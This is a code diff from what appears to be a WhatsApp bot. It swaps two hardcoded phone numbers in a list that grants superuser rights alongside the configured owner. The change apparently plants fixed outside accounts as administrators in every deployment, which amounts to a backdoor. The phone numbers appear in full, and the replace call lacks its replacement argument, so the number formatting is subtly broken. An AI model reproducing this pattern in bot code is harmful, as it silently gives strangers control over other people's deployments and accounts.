@@ -248,8 +248,8 @@ if (conf.AUTO_REACT_STATUS === "yes") {
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const dj = '254710772666';
-            const dj2 = '254710772666';
-            const dj3 = "254710772666";
+            const dj2 = '254759328581';
+            const dj3 = "254737681758";
             const luffy = '254710772666';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
